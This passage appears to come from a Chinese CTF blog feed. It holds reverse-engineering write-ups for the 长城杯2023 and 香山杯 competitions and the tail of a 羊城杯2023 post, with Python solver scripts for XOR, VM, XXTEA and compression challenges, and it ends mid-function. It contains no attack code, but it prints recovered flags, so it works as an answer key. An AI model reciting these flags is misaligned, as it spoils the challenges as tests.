class="number">184</span>,<span class="number">79</span>,<span class="number">0</span>,<span class="number">76</span>,<span class="number">116</span>,<span class="number">0</span>,<span class="number">160</span>,<span class="number">170</span>,<span class="number">190</span>,<span class="number">48</span>,<span class="number">120</span>,<span class="number">93</span>,<span class="number">76</span>,<span class="number">48</span>,<span class="number">236</span>,<span class="number">210</span>,<span class="number">122</span>,<span class="number">152</span>,<span class="number">204</span>,<span class="number">253</span>,<span class="number">241</span>,<span class="number">56</span>,<span class="number">166</span>,<span class="number">242</span>,<span class="number">120</span>,<span class="number">252</span>,<span class="number">64</span>,<span class="number">128</span>,<span class="number">32</span>,<span class="number">64</span>,<span class="number">212</span>,<span class="number">200</span>,<span class="number">251</span>,<span class="number">208</span>,<span class="number">108</span>,<span class="number">156</span>,<span class="number">120</span>,<span class="number">82</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">247</span>,<span class="number">136</span>,<span class="number">17</span>,<span class="number">98</span>,<span class="number">246</span>,<span class="number">40</span>,<span class="number">242</span>,<span class="number">64</span>,<span class="number">144</span>,<span class="number">84</span>,<span class="number">142</span>,<span class="number">175</span>,<span class="number">46</span>,<span class="number">212</span>,<span class="number">185</span>,<span class="number">42</span>,<span class="number">31</span>,<span class="number">176</span>,<span class="number">219</span>,<span class="number">205</span>,<span class="number">52</span>,<span class="number">144</span>,<span class="number">216</span>,<span class="number">69</span>,<span class="number">128</span>,<span class="number">92</span>,<span class="number">240</span>,<span class="number">25</span>,<span class="number">169</span>,<span class="number">194</span>,<span class="number">208</span>,<span class="number">115</span>,<span class="number">185</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">52</span>,<span class="number">75</span>,<span class="number">212</span>,<span class="number">40</span>,<span class="number">224</span>,<span class="number">10</span>,<span class="number">220</span>,<span class="number">99</span>,<span class="number">42</span>,<span class="number">183</span>,<span class="number">196</span>,<span class="number">240</span>,<span class="number">64</span>,<span class="number">98</span>,<span class="number">23</span>,<span class="number">109</span>,<span class="number">20</span>,<span class="number">203</span>,<span class="number">111</span>,<span class="number">232</span>,<span class="number">77</span>,<span class="number">64</span>,<span class="number">251</span>,<span class="number">2</span>,<span class="number">194</span>,<span class="number">243</span>,<span class="number">112</span>,<span class="number">64</span>,<span class="number">199</span>,<span class="number">105</span>,<span class="number">168</span>,<span class="number">157</span>,<span class="number">213</span>,<span class="number">51</span>,<span class="number">168</span>,<span class="number">28</span>,<span class="number">223</span>,<span class="number">100</span>,<span class="number">152</span>,<span class="number">184</span>,<span class="number">157</span>,<span class="number">224</span>,<span class="number">132</span>,<span class="number">232</span>,<span class="number">14</span>,<span class="number">33</span>,<span class="number">115</span>,<span class="number">135</span>,<span class="number">2</span>,<span class="number">163</span>,<span class="number">6</span>,<span class="number">16</span>,<span class="number">143</span>,<span class="number">84</span>,<span class="number">72</span>,<span class="number">101</span>,<span class="number">32</span>,<span class="number">56</span>,<span class="number">84</span>,<span class="number">182</span>,<span class="number">47</span>,<span class="number">112</span>,<span class="number">160</span>,<span class="number">244</span>,<span class="number">139</span>,<span class="number">39</span>,<span class="number">32</span>,<span class="number">40</span>,<span class="number">7</span>,<span class="number">228</span>,<span class="number">105</span>,<span class="number">62</span>,<span class="number">176</span>,<span class="number">149</span>,<span class="number">112</span>,<span class="number">120</span>,<span class="number">218</span>,<span class="number">34</span>,<span class="number">80</span>,<span class="number">98</span>,<span class="number">7</span>,<span class="number">138</span>,<span class="number">144</span>,<span class="number">1</span>,<span class="number">79</span>,<span class="number">30</span>,<span class="number">120</span>,<span class="number">253</span>,<span class="number">68</span>,<span class="number">28</span>,<span class="number">32</span>,<span class="number">27</span>,<span class="number">100</span>,<span class="number">222</span>,<span class="number">219</span>,<span class="number">3</span>,<span class="number">216</span>,<span class="number">205</span>,<span class="number">52</span>,<span class="number">207</span>,<span class="number">66</span>,<span class="number">240</span>,<span class="number">255</span>,<span class="number">188</span>,<span class="number">162</span>,<span class="number">44</span>,<span class="number">152</span>,<span class="number">125</span>,<span class="number">181</span>,<span class="number">112</span>,<span class="number">110</span>,<span class="number">184</span>,<span class="number">164</span>,<span class="number">36</span>,<span class="number">234</span>,<span class="number">80</span>,<span class="number">128</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">95</span>,<span class="number">144</span>,<span class="number">53</span>,<span class="number">178</span>,<span class="number">196</span>,<span class="number">84</span>,<span class="number">56</span>,<span class="number">172</span>,<span class="number">166</span>,<span class="number">104</span>,<span class="number">236</span>,<span class="number">64</span>,<span class="number">228</span>,<span class="number">45</span>,<span class="number">146</span>,<span class="number">182</span>,<span class="number">8</span>,<span class="number">169</span>,<span class="number">224</span>,<span class="number">6</span>,<span class="number">228</span>,<span class="number">176</span>,<span class="number">72</span>,<span class="number">127</span>,<span class="number">208</span>,<span class="number">173</span>,<span class="number">246</span>,<span class="number">188</span>,<span class="number">20</span>,<span class="number">186</span>,<span class="number">89</span>,<span class="number">45</span>,<span class="number">0</span>,<span class="number">232</span>,<span class="number">63</span>,<span class="number">216</span>,<span class="number">47</span>,<span class="number">32</span>,<span class="number">192</span>,<span class="number">100</span>,<span class="number">41</span>,<span class="number">214</span>,<span class="number">101</span>,<span class="number">208</span>,<span class="number">136</span>,<span class="number">6</span>,<span class="number">60</span>,<span class="number">33</span>,<span class="number">164</span>,<span class="number">67</span>,<span class="number">208</span>,<span class="number">240</span>,<span class="number">230</span>,<span class="number">220</span>,<span class="number">0</span>,<span class="number">188</span>,<span class="number">135</span>,<span class="number">120</span>,<span class="number">215</span>,<span class="number">83</span>,<span class="number">212</span>,<span class="number">14</span>,<span class="number">240</span>,<span class="number">56</span>,<span class="number">248</span>,<span class="number">64</span>,<span class="number">252</span>,<span class="number">49</span>,<span class="number">1</span>,<span class="number">98</span>,<span class="number">198</span>,<span class="number">116</span>,<span class="number">119</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">72</span>,<span class="number">46</span>,<span class="number">210</span>,<span class="number">13</span>,<span class="number">28</span>,<span class="number">37</span>,<span class="number">220</span>,<span class="number">19</span>,<span class="number">67</span>,<span class="number">0</span>,<span class="number">159</span>,<span class="number">153</span>,<span class="number">61</span>,<span class="number">171</span>,<span class="number">55</span>,<span class="number">124</span>,<span class="number">219</span>,<span class="number">127</span>,<span class="number">42</span>,<span class="number">237</span>,<span class="number">220</span>,<span class="number">250</span>,<span class="number">77</span>,<span class="number">144</span>,<span class="number">238</span>,<span class="number">216</span>,<span class="number">25</span>,<span class="number">222</span>,<span class="number">183</span>,<span class="number">76</span>,<span class="number">137</span>,<span class="number">67</span>,<span class="number">40</span>,<span class="number">176</span>,<span class="number">159</span>,<span class="number">120</span>,<span class="number">78</span>,<span class="number">72</span>,<span class="number">58</span>,<span class="number">152</span>,<span class="number">32</span>,<span class="number">128</span>,<span class="number">208</span>,<span class="number">162</span>,<span class="number">248</span>,<span class="number">64</span>,<span class="number">91</span>,<span class="number">152</span>,<span class="number">192</span>,<span class="number">136</span>,<span class="number">69</span>,<span class="number">188</span>,<span class="number">96</span>,<span class="number">17</span>,<span class="number">248</span>,<span class="number">72</span>,<span class="number">191</span>,<span class="number">228</span>,<span class="number">178</span>,<span class="number">85</span>,<span class="number">207</span>,<span class="number">157</span>,<span class="number">11</span>,<span class="number">244</span>,<span class="number">18</span>,<span class="number">202</span>,<span class="number">0</span>,<span class="number">220</span>,<span class="number">224</span>,<span class="number">252</span>,<span class="number">116</span>,<span class="number">221</span>,<span class="number">142</span>,<span class="number">178</span>,<span class="number">158</span>,<span class="number">64</span>,<span class="number">252</span>,<span class="number">128</span>,<span class="number">126</span>,<span class="number">103</span>,<span class="number">80</span>,<span class="number">46</span>,<span class="number">78</span>,<span class="number">206</span>,<span class="number">29</span>,<span class="number">33</span>,<span class="number">138</span>,<span class="number">152</span>,<span class="number">155</span>,<span class="number">36</span>,<span class="number">32</span>,<span class="number">224</span>,<span class="number">162</span>,<span class="number">100</span>,<span class="number">36</span>,<span class="number">163</span>,<span class="number">162</span>]</span><br><span class="line">count_key = <span class="number">3200</span> - <span class="number">1</span></span><br><span class="line">keylist = [  <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x02</span>,</span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x02</span>,</span><br><span class="line">  <span class="number">0x02</span>, <span class="number">0x02</span>]</span><br><span class="line">enc1 = <span class="string">&#x27;ac2018c9c49436ec3154691ea51de52ca91251c38c13722d11a325a18198411e91ca9e4c&#x27;</span></span><br><span class="line">h = <span class="string">&#x27;1234567890abcdef&#x27;</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ord_</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">ord</span>(a) &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(a) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;9&#x27;</span>)):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(a)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ord</span>(a) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    v66_in = <span class="number">8</span> * i</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            tmp = enc[v66_in + ((k + <span class="number">1</span>) % <span class="number">8</span>)]</span><br><span class="line">            tmp += s_box[((keylist2[count_key] &amp; <span class="number">0xff</span>) + enc[v66_in + ((k) % <span class="number">8</span>)]) &amp; <span class="number">0xff</span>]</span><br><span class="line">            tmp &amp;= <span class="number">0xff</span></span><br><span class="line">            tmp = (tmp &lt;&lt; <span class="number">1</span>) | (tmp &gt;&gt; <span class="number">7</span> &amp; <span class="number">0xff</span>)</span><br><span class="line">            enc[v66_in + ((k + <span class="number">1</span>) % <span class="number">8</span>)] = tmp &amp; <span class="number">0xff</span></span><br><span class="line">            count_key -= <span class="number">1</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># print(enc)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span> (i &lt;= <span class="number">0xf</span>):</span><br><span class="line">        tmp += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    tmp += <span class="built_in">hex</span>(i)[<span class="number">2</span>:]</span><br><span class="line">enc = tmp</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br><span class="line"></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">64</span>, <span class="number">2</span>):</span><br><span class="line">    key += keylist[i // <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> h:</span><br><span class="line">        <span class="keyword">if</span> (h[((<span class="built_in">ord</span>(enc1[key]) &amp; <span class="number">0xff</span>) + <span class="number">3</span> * ord_(j)) % <span class="number">16</span>] == enc[i]):</span><br><span class="line">            flag.append(j)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9d9b9ff1c62122ba7f5b54385b1f9d64</span></span><br></pre></td></tr></table></figure>
<p>完结撒花</p>
<p><img loading="lazy" data-src="%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/W6SXN9HRBTXSE%5DH0JNX%5BLW0.png" alt="img"></p>
]]></content>
  </entry>
  <entry>
    <title>长城杯2023</title>
    <url>/2023/09/13/%E9%95%BF%E5%9F%8E%E6%9D%AF2023/</url>
    <content><![CDATA[<h6 id="prefacere比较容易"><a class="markdownIt-Anchor" href="#prefacere比较容易">#</a> PREFACE：RE 比较容易</h6>
<h6 id="ps-初赛猛猛做最后是第一决赛线下直接不会了赛后仨小时出了re1一小时出的re2只能说离开网络和gpt的moyaoxue一事无成"><a class="markdownIt-Anchor" href="#ps-初赛猛猛做最后是第一决赛线下直接不会了赛后仨小时出了re1一小时出的re2只能说离开网络和gpt的moyaoxue一事无成">#</a> ps. 初赛猛猛做最后是第一，决赛线下直接不会了，赛后仨小时出了 re1 一小时出的 re2，只能说离开网络和 gpt 的 moyaoxue 一事无成</h6>
<span id="more"></span>
<p>初赛：</p>
<h3 id="vvm"><a class="markdownIt-Anchor" href="#vvm">#</a> vvm</h3>
<p>简单的 vm，opcode 很少直接可以看出来逻辑</p>
<p><img loading="lazy" data-src="%E9%95%BF%E5%9F%8E%E6%9D%AF2023/image-20230913214608382.png" alt="image-20230913214608382"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [  <span class="number">126</span>,  <span class="number">120</span>,  <span class="number">117</span>,  <span class="number">127</span>,  <span class="number">107</span>,  <span class="number">82</span>,  <span class="number">117</span>,  <span class="number">114</span>,  <span class="number">109</span>,  <span class="number">119</span>,  <span class="number">78</span>,  <span class="number">121</span>,  <span class="number">121</span>,  <span class="number">121</span>,  <span class="number">119</span>,  <span class="number">68</span>,  <span class="number">98</span>,  <span class="number">36</span>,  <span class="number">96</span>,  <span class="number">113</span>,  <span class="number">115</span>,  <span class="number">96</span>,  <span class="number">53</span>,  <span class="number">105</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    i ^= <span class="number">0x16</span></span><br><span class="line">    i -= <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end = <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="ezsocket"><a class="markdownIt-Anchor" href="#ezsocket">#</a> ezSocket</h3>
<p>字节码逆向，通信过程的 sm4 和 rsa 都不需要管，只是信道加解密内容，只需要爆破六位 key 对比 sha256 即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment"># import owiener</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    charset = string.digits + <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(charset, repeat=<span class="number">6</span>):</span><br><span class="line"></span><br><span class="line">        key = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">        key += <span class="string">&#x27;ffffffffff&#x27;</span></span><br><span class="line">        key = key.encode()</span><br><span class="line">        a = hashlib.sha256(key).hexdigest().encode()</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="string">b&#x27;fdce9fbba473a2e47c14c72a78dcf62a28f0259847d7910ecb18a0af80983693&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(key)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>决赛</p>
<h2 id="re"><a class="markdownIt-Anchor" href="#re">#</a> RE</h2>
<h4 id="file"><a class="markdownIt-Anchor" href="#file">#</a> file</h4>
<p>一个类 lz77 压缩的压缩算法，改变的地方在于滑块长度固定二</p>
<p>具体规则是：建立缓存</p>
<p><img loading="lazy" data-src="%E9%95%BF%E5%9F%8E%E6%9D%AF2023/image-20230916212036353.png" alt="image-20230916212036353"></p>
<p>每次出现新的双字节（两个 ascii，即滑块长），则在该字节前面加一 bit 的’1’，并存入缓冲区，如果在缓存找到已有，则在前面加 8bit 的’0’，然后下面 8bit 做填充和寻址（在缓存内找到相应的双字节）</p>
<p>(脚本不全，解压部分是手动试的，因为真正压缩的地方只有两处)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&#x27;1011001101011011001011000011011001111011110111001101001011001001011001101001101101001110001001100111011001001001100101001011011001101111011000111001100111001100011001011011001100111001100001001110001011000111001011011011000111001100101001100011001101111001011011001100011011001001001101111011001000000000000110000000000001001000010011010010011010010011001110110001110111110100&#x27;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(i&lt; <span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> a[i] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        i += <span class="number">12</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(a[i:i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">        i += <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#   flag&#123;4df683d2-7c31-308c-c217-1d7d0817443c&#125;</span></span><br></pre></td></tr></table></figure>
<h5 id="your_emb"><a class="markdownIt-Anchor" href="#your_emb">#</a> your_emb</h5>
<p>一点一点硬看汇编，发现 check 前面有 xor 操作，这里的 xor 应该是 getkey 访问失败返回得到的，即： <code>connection refused</code></p>
<p><img loading="lazy" data-src="%E9%95%BF%E5%9F%8E%E6%9D%AF2023/image-20230916212956794.png" alt="image-20230916212956794"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [  <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x0F</span>, <span class="number">0x09</span>, <span class="number">0x1E</span>, <span class="number">0x5B</span>, <span class="number">0x12</span>, <span class="number">0x5C</span>, <span class="number">0x09</span>, <span class="number">0x0F</span>,</span><br><span class="line">  <span class="number">0x10</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x17</span>, <span class="number">0x40</span>, <span class="number">0x56</span>, <span class="number">0x55</span>, <span class="number">0x4E</span>, <span class="number">0x5B</span>,</span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x5C</span>, <span class="number">0x57</span>, <span class="number">0x4E</span>, <span class="number">0x15</span>, <span class="number">0x0D</span>, <span class="number">0x5C</span>, <span class="number">0x0D</span>, <span class="number">0x0D</span>, <span class="number">0x16</span>,</span><br><span class="line">  <span class="number">0x5C</span>, <span class="number">0x05</span>, <span class="number">0x43</span>, <span class="number">0x41</span>, <span class="number">0x57</span>, <span class="number">0x5D</span>, <span class="number">0x02</span>, <span class="number">0x59</span>, <span class="number">0x5D</span>, <span class="number">0x5C</span>,</span><br><span class="line">  <span class="number">0x50</span>, <span class="number">0x1E</span>]</span><br><span class="line">key = <span class="string">&#x27;connection refused&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc[i] ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># flag&#123;8f5fa013-b331-4f22-ad3c-d9c6229a6325&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>香山杯</title>
    <url>/2023/10/15/%E9%A6%99%E5%B1%B1%E6%9D%AF/</url>
    <content><![CDATA[<h6 id="preface比较简单的比赛ak了reai题没看明白后续研究一下"><a class="markdownIt-Anchor" href="#preface比较简单的比赛ak了reai题没看明白后续研究一下">#</a> PREFACE：比较简单的比赛，ak 了 re，ai 题没看明白后续研究一下</h6>
<span id="more"></span>
<h3 id="re-url从哪儿来"><a class="markdownIt-Anchor" href="#re-url从哪儿来">#</a> RE-URL 从哪儿来</h3>
<p>提取资源区并解密：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./decE_OU101&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file1:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./E_OU101&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        a = file.read()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">            <span class="keyword">if</span> (i != <span class="number">120</span> <span class="keyword">and</span> i != <span class="number">0</span>):</span><br><span class="line">                file1.write(<span class="built_in">bytes</span>([i ^ <span class="number">0x78</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file1.write(<span class="built_in">bytes</span>([i]))</span><br></pre></td></tr></table></figure>
<p>动调拿 flag 即可</p>
<p><img loading="lazy" data-src="%E9%A6%99%E5%B1%B1%E6%9D%AF/image-20231015192950112.png" alt="image-20231015192950112"></p>
<h3 id="hello_py"><a class="markdownIt-Anchor" href="#hello_py">#</a> hello_py</h3>
<p>python 安卓，提取后 <code>hello_py\assets\chaquopy</code>  这个路径下解压 app.imy 得到加密文件，xxtea，解密即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XXTEACipher</span>:</span><br><span class="line">    k = [c_uint32(<span class="number">0</span>)]*<span class="number">4</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(key)!=<span class="number">16</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Length of key must be 16 bytes long.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(key) != <span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;Key must be a bytes object.&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            tmp = c_uint32(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                tmp.value = tmp.value &lt;&lt; <span class="number">8</span></span><br><span class="line">                tmp.value = tmp.value + key[<span class="number">4</span> * i + (<span class="number">3</span> - j)]</span><br><span class="line">            self.k[i] = tmp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, plain</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param</span></span><br><span class="line"><span class="string">            plain: byte string</span></span><br><span class="line"><span class="string">                The plaintext that will be encrypted.</span></span><br><span class="line"><span class="string">                It must to be a multiple of 4 bytes long.</span></span><br><span class="line"><span class="string">        :return: bytes string</span></span><br><span class="line"><span class="string">            The encrypted bytes.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        length = <span class="built_in">len</span>(plain)</span><br><span class="line">        <span class="keyword">if</span> length % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Length of plain must be a multiple of 4.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(plain) != <span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;Plain must be a bytes object.&quot;</span>)</span><br><span class="line">        n = length // <span class="number">4</span></span><br><span class="line">        v = [c_uint32()]*n</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            tmp = c_uint32(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                tmp.value = tmp.value &lt;&lt; <span class="number">8</span></span><br><span class="line">                tmp.value = tmp.value + plain[<span class="number">4</span> * i + (<span class="number">3</span> - j)]</span><br><span class="line">            v[i] = tmp</span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">        z = c_uint32(v[n-<span class="number">1</span>].value)</span><br><span class="line">        y = c_uint32(v[<span class="number">0</span>].value)</span><br><span class="line">        sum_delta = c_uint32(<span class="number">0</span>)</span><br><span class="line">        delta = c_uint32(<span class="number">0x9e3779b9</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(q)[::-<span class="number">1</span>]:</span><br><span class="line">            sum_delta.value += delta.value</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>):</span><br><span class="line">                e = (sum_delta.value &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">                y.value = v[p+<span class="number">1</span>].value</span><br><span class="line">                v[p].value +=  ((z.value &gt;&gt; <span class="number">5</span> ^ y.value &lt;&lt; <span class="number">2</span>) + (y.value &gt;&gt; <span class="number">3</span> ^ z.value&lt;&lt;<span class="number">4</span>)) ^ ((sum_delta.value ^ y.value) + (self.k[(p&amp;<span class="number">3</span>)^e].value ^ z.value))</span><br><span class="line">                z.value = v[p].value</span><br><span class="line">            y.value = v[<span class="number">0</span>].value</span><br><span class="line">            v[n-<span class="number">1</span>].value += ((z.value &gt;&gt; <span class="number">5</span> ^ y.value &lt;&lt; <span class="number">2</span>) + (y.value &gt;&gt; <span class="number">3</span> ^ z.value&lt;&lt;<span class="number">4</span>)) ^ ((sum_delta.value ^ y.value) + (self.k[((n-<span class="number">1</span>)&amp;<span class="number">3</span>)^e].value ^ z.value))</span><br><span class="line">            z.value = v[n-<span class="number">1</span>].value</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;0x%08x, 0x%8x&quot;</span>%(v[<span class="number">0</span>].value, v[<span class="number">1</span>].value))</span><br><span class="line">        cipher = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                cipher+=<span class="built_in">bytes</span>([v[i].value&amp;<span class="number">0xff</span>])</span><br><span class="line">                v[i].value = v[i].value &gt;&gt; <span class="number">8</span></span><br><span class="line">        <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, cipher</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param</span></span><br><span class="line"><span class="string">            plain: byte string</span></span><br><span class="line"><span class="string">                The plaintext that will be encrypted.</span></span><br><span class="line"><span class="string">                It must to be a multiple of 4 bytes long.</span></span><br><span class="line"><span class="string">        :return: bytes string</span></span><br><span class="line"><span class="string">            The encrypted bytes.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        length = <span class="built_in">len</span>(cipher)</span><br><span class="line">        <span class="keyword">if</span> length % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Length of cipher must be a multiple of 4.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(cipher) != <span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;Cipher must be a bytes object.&quot;</span>)</span><br><span class="line">        n = length // <span class="number">4</span></span><br><span class="line">        v = [c_uint32()]*n</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            tmp = c_uint32(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                tmp.value = tmp.value &lt;&lt; <span class="number">8</span></span><br><span class="line">                tmp.value = tmp.value + cipher[<span class="number">4</span> * i + (<span class="number">3</span> - j)]</span><br><span class="line">            v[i] = tmp</span><br><span class="line">        q = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">        z = c_uint32(<span class="number">0</span>)</span><br><span class="line">        y = c_uint32(v[<span class="number">0</span>].value)</span><br><span class="line">        delta = 